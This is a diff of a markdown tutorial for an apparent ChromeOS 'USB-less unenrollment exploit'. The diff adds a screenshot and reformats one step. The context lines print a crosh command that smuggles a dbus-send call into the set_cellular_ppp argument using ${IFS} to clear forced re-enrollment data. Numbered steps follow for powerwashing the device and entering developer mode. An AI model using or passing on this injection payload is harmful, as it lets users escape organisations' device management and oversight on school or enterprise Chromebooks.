@@ -22,7 +22,10 @@ Pretty cool universal USB-less unenrollment exploit that requires you to have a 
 
 `set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'`
 
-5. Press enter.
+Just like this \
+<img src="/img/tutorial/crosh-rootesc.png" width="1000">
+
+5. Press `enter`.
 6. Back up all data to an external media (like a USB flash drive) or a cloud service (like Google Drive).
 7. Press `esc+⟳+⏻ ` (`esc+refresh+power`).
 8. Press `ctrl+d` and then `enter`.
